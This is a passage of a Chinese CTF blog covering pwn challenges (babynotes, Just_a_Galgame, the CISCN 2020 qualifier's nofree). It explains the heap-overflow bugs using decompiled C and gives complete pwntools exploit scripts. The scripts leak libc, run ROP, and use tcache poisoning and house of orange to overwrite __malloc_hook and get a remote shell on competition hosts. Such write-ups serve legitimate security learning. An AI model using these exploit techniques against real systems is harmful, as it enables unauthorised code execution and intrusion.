flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">0x200</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, bss - <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([leave_ret])</span><br><span class="line">leave_message(payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - write_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload = flat([pop_rdi, str_bin_sh, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, ret, libc_system])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400AA0 loc_400AA0:                             ; CODE XREF: __libc_csu_init+54↓j</span></span><br><span class="line"><span class="string">.text:0000000000400AA0                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400AA3                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400AA6                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400AA9                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400AAD                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400AB1                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400AB4                 jnz     short loc_400AA0</span></span><br><span class="line"><span class="string">.text:0000000000400AB6</span></span><br><span class="line"><span class="string">.text:0000000000400AB6 loc_400AB6:                             ; CODE XREF: __libc_csu_init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400AB6                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000400ABA                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000400ABB                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000400ABC                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000400ABE                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400AC0                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400AC2                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400AC4                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h1><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>reset 功能重新调用了一次 regist ，而 regist 中输入的 name 和 age 在 buffer 上连续，在 strcpy 的时候存在一次 heap overflow 的机会：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  motto = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x18</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your motto: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">0x20</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your age: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lld"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(motto, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0x20</span>uLL);</span><br><span class="line">  age = v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可见age的位置在<code>strcpy(dest, &amp;s);</code>的时候也会同时被复制进去，因此可以覆盖下一个chunk的size。</p></li><li><p>利用 heap overflow 伪造 size ，形成 chunk overlap ，然后利用<code>show</code>leak出 libc 地址，再 tcache poisoning 打<code>__malloc_hook</code>为 onegadget 即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">43121</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regit</span><span class="params">(name, motto, age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"Input your name: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"Input your motto: "</span>, motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your age: "</span>, str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Input note size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Note "</span> + str(idx) + <span class="string">": "</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, note)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Input your note: "</span>, note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">(name, motto, age)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    regit(name, motto, age)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"7"</span>)</span><br><span class="line"></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line">regit(<span class="string">"AAA"</span>, <span class="string">"AAA"</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">reset(<span class="string">"A"</span> * <span class="number">0x18</span>, <span class="string">"B"</span> * <span class="number">0x18</span>, <span class="number">0x91</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _malloc_hook</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x88</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h1><h1 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h1><ol><li><p>由于<code>add</code>功能是<code>malloc(0x68)</code>，而<code>edit</code>是功能可以覆盖<code>read(0, (void *)(chunk_array[v4] + 0x60), 0x10uLL);</code>显然存在一个heap overflow可以覆盖size。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Emmm...Alright. Thank you."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  --v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Wow! Thanks~\n"</span>);</span><br><span class="line">  chunk_array[<span class="number">6</span> - v6] = (__int64)<span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[ You've hold some place in her heart! ]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> || v6 &gt; <span class="number">6</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Emmm...Sorry I should go home now. Maybe the next time.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Okay~ Let's choose a movie!\n"</span>);</span><br><span class="line">  --v7;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx &gt;&gt; "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_array[atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf)] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"movie name &gt;&gt; "</span>);</span><br><span class="line">    v4 = atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(chunk_array[v4] + <span class="number">0x60</span>), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nHotaru: What a good movie! I like it~\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[ You've gained a lot favor of her! ]"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[ The movie is not exist. ]"</span>);</span><br><span class="line">    ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure></li><li><p>注意到程序没有<code>delete</code>功能，那么就利用heap overflow覆盖top chunk的size，在利用house of orange，即利用<code>malloc(0x1000)</code>把old top chunk放入unsorted bin中：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> || v6 &gt; <span class="number">6</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Sorry, I think it's better for us to be friends.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  --v8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You are the apple of my eyes too!"</span>);</span><br><span class="line">  big_chunk = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  ++v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure></li><li><p>然后从unsorted bin分配chunk，再利用<code>show</code>leak出libc地址；同时<code>edit</code>没有对下标进行检查，而且<code>Leave</code>功能读入的字符串的位置就在<code>bss</code>上 chunk array 的后面：</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span> <span class="comment">; __int64 chunk_array[7]</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span> chunk_array     <span class="built_in">dq</span> ?                    <span class="comment">; DATA XREF: main+C3↑w</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span>                                         <span class="comment">; main+146↑r ...</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404068</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404070</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404078</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404080</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404088</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404090</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404098</span> big_chunk       <span class="built_in">dq</span> ?                    <span class="comment">; DATA XREF: main+1F9↑w</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A0 msg             <span class="built_in">db</span>    ? <span class="comment">;               ; DATA XREF: main+270↑o</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A0                                         <span class="comment">; main+284↑o</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A1                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A2                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A3                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A4                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A5                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A6                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A7                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A7 _bss            ends</span><br></pre></td></tr></table></figure><p> 所以利用<code>Leave</code>在<code>msg</code>处写入<code>__malloc_hook - 0x60</code>，然后利用<code>edit</code>打<code>_malloc_hook</code>为 onegadget 即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">52114</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx &gt;&gt; "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"movie name &gt;&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bigchunk</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(str(idx) + <span class="string">": "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>, message)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># house of orange</span></span><br><span class="line">add() <span class="comment"># chunk 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">8</span> + p64(<span class="number">0xD41</span>))</span><br><span class="line">bigchunk() </span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">add() <span class="comment"># chunk 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x660</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">msg(p64(__malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">edit(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn比赛，但是太弱了只能做简单的题，难题只能赛后学习别人的wp了；最后跟着队里打进了前十，大哥们太猛了！就简单记录一下自己做得题好了，本来是想着复现一些题的，但是时间上目前比较吃紧，以后有时间再看吧（咕咕咕）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2020 初赛 pwn</title>
    <link href="https://n0nop.github.io/2020/08/21/CISCN-2020-%E5%88%9D%E8%B5%9B-pwn/"/>
    <id>https://n0nop.github.io/2020/08/21/CISCN-2020-%E5%88%9D%E8%B5%9B-pwn/</id>
    <published>2020-08-21T09:06:42.000Z</published>
    <updated>2020-08-24T07:09:12.270Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/215100" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215100</a></p><p>pwn题全都没给libc，不过好在nofree那道题搞出来之后直接查出来libc的版本，后面就轻松很多了。wow这道题搞了很久，主要代码太长看得有点心累，再看解出题的队伍蛮多的就死磕了。</p><a id="more"></a><h1 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h1><p>这题我附件都没搞下来就被秒得稀烂了，最后队友说就是个python2会eval输入的内容（最后附件我也没搞下来，速度太慢了），反正是个水题。</p><h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><ol><li><p>只有两个功能，一个<code>new</code>（这个<code>malloc</code>是我自己命名的，只是为了方便看，实际上是通过<code>strdup</code>里的<code>malloc</code>进行分配的）：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_idx();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">    result = choice();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">0x90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">256</span>] = <span class="built_in">malloc</span>(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">malloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 